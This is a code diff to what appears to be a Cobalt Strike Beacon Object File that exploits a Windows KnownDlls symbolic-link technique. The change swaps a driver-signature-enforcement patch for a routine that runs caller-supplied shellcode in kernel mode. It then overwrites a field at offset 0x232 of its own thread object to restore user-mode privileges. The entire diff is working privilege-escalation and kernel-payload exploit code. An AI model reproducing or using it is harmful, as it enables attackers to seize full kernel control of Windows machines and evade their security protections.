@@ -25,6 +25,7 @@
 D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT Argc ) {
 	if ( BeaconApi->BeaconIsAdmin( ) ) {
 
+		INT				ShcLen = 0;
 		INT				LenInf = 0;
 		INT				NamLen = 0;
 		INT				DllLen = 0;
@@ -61,6 +62,9 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 
 		HKEY				RegKey = NULL;
 
+		PVOID				ShcPtr = NULL;
+		PVOID				ObjPtr = NULL;
+		PVOID				MyThrd = NULL;
 		PVOID				NtlMod = NULL;
 		PVOID				K32Mod = NULL;
 		PVOID				AdvMod = NULL;
@@ -119,15 +123,19 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		ApiTbl.SetThreadToken               = PeGetFuncEat( AdvMod, H_API_SETTHREADTOKEN );
 		ApiTbl.LoadLibraryExA               = PeGetFuncEat( K32Mod, H_API_LOADLIBRARYEXA );
 		ApiTbl.GetProcAddress               = PeGetFuncEat( K32Mod, H_API_GETPROCADDRESS );
+		ApiTbl.NtOpenProcess                = PeGetFuncEat( NtlMod, H_API_NTOPENPROCESS );
 		ApiTbl.RtlGetVersion                = PeGetFuncEat( NtlMod, H_API_RTLGETVERSION );
+		ApiTbl.NtOpenThread                 = PeGetFuncEat( NtlMod, H_API_NTOPENTHREAD );
 		ApiTbl.FreeLibrary                  = PeGetFuncEat( K32Mod, H_API_FREELIBRARY );
 		ApiTbl.RtlEqualSid                  = PeGetFuncEat( NtlMod, H_API_RTLEQUALSID );
+		ApiTbl.NtOpenFile                   = PeGetFuncEat( NtlMod, H_API_NTOPENFILE );
 		ApiTbl.LocalAlloc                   = PeGetFuncEat( K32Mod, H_API_LOCALALLOC );
 		ApiTbl._vsnprintf                   = PeGetFuncEat( NtlMod, H_API_VSNPRINTF );
 		ApiTbl.WriteFile                    = PeGetFuncEat( K32Mod, H_API_WRITEFILE );
 		ApiTbl.LocalFree                    = PeGetFuncEat( K32Mod, H_API_LOCALFREE );
 		ApiTbl.NtClose                      = PeGetFuncEat( NtlMod, H_API_NTCLOSE );
 		ApiTbl.Sleep                        = PeGetFuncEat( K32Mod, H_API_SLEEP );
+		ApiTbl.Beep                         = PeGetFuncEat( K32Mod, H_API_BEEP );
 
 		OsVers.dwOSVersionInfoSize = sizeof( OsVers );
 		ApiTbl.RtlGetVersion( &OsVers );
@@ -143,6 +151,7 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 		RegNam = BeaconApi->BeaconDataExtract( &Parser, NULL );
 		DllBuf = BeaconApi->BeaconDataExtract( &Parser, &DllLen );
 		PidNum = BeaconApi->BeaconDataInt( &Parser );
+		ShcPtr = BeaconApi->BeaconDataExtract( &Parser, &ShcLen );
 
 		KwnPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls\0" ) ), DllNam );
 		LnkPth = StringPrintAToW( &ApiTbl, C_PTR( G_SYM( "\\GLOBAL??\\KnownDlls\\%ls\0" ) ), LnkNam );
@@ -313,7 +322,32 @@ D_SEC( A ) VOID BofStart( _In_ PBEACON_API BeaconApi, _In_ PVOID Argv, _In_ INT 
 						{
 							if ( ! ApiTbl.NtWaitForSingleObject( ProcIn.hThread, FALSE, NULL ) ) 
 							{
-								DsePatchPte( BeaconApi, &ApiTbl );
+								RtlSecureZeroMemory( &ObjAtt, sizeof( ObjAtt ) );
+								InitializeObjectAttributes( &ObjAtt, 0, 0, 0, 0 );
+
+								PteExecuteKernelPayload( BeaconApi, &ApiTbl, ShcPtr, ShcLen );
+
+								if ( ! ApiTbl.NtOpenThread( &MyThrd, THREAD_ALL_ACCESS, &ObjAtt, &NtCurrentTeb()->ClientId ) ) {
+									if ( ( ObjPtr = ObjFromHandle( BeaconApi, &ApiTbl, MyThrd ) ) ) 
+									{
+										/* Disable KM Privileges */
+										ApiTbl.NtWriteVirtualMemory
+										( 
+											( ( HANDLE ) - 1 ),
+											C_PTR( U_PTR( ObjPtr ) + 0x232 ),
+											&( UCHAR ){ 0x1 },
+											sizeof( UCHAR ),
+											NULL
+										);
+
+									} else {
+										BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not get a pointer to our object." ) ) );
+										goto Leave;
+									};
+								} else {
+									BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "could not open our thread." ) ) );
+									goto Leave;
+								};
 							} else {
 								BeaconApi->BeaconPrintf( CALLBACK_ERROR, C_PTR( G_SYM( "wait was aborted unexpectedly." ) ) );
 								goto Leave;
@@ -371,6 +405,9 @@ Leave:
 		};
 		if ( RegKey != NULL ) {
 			/* RegCloseKey */
+		};
+		if ( MyThrd != NULL ) {
+			ApiTbl.NtClose( MyThrd );
 		};
 		if ( DupUsr != NULL ) {
 			ApiTbl.NtClose( DupUsr );
